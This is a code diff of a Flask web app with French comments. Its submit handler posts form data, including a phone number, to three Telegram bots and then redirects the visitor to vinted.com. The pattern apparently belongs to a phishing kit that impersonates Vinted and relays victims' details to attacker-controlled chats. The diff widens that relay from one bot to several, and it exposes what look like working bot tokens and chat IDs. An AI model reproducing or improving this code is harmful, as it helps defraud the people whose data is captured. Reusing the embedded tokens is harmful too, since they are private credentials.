@@ -3,8 +3,12 @@ import requests
 
 app = Flask(__name__)
 
-BOT_TOKEN = "8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A"
-CHAT_ID = "6297861735"
+# Liste des bots et chats
+TELEGRAM_BOTS = [
+    {"token": "8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A", "chat_id": "6297861735"},
+    {"token": "7858273702:AAEMIDAD8ZwY_Y0iZliX-5YPXNoHCkeB9HQ", "chat_id": "5214147917"},
+    {"token": "8061642865:AAHHUZGH3Kzx7tN2PSsyLc53235DcVzMqKs", "chat_id": "7650873997"},
+]
 
 @app.route('/')
 def index():
@@ -24,14 +28,15 @@ def submit():
 📞 Téléphone : {telephone}
 """
 
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {'chat_id': CHAT_ID, 'text': message}
+    for bot in TELEGRAM_BOTS:
+        url = f"https://api.telegram.org/bot{bot['token']}/sendMessage"
+        payload = {'chat_id': bot['chat_id'], 'text': message}
 
-    try:
-        response = requests.post(url, data=payload)
-        response.raise_for_status()
-    except requests.exceptions.RequestException as e:
-        return f"Erreur d’envoi : {e}", 500
+        try:
+            response = requests.post(url, data=payload)
+            response.raise_for_status()
+        except requests.exceptions.RequestException as e:
+            return f"Erreur d’envoi avec le bot {bot['token'][:10]}... : {e}", 500
 
     return redirect("https://www.vinted.com")
 
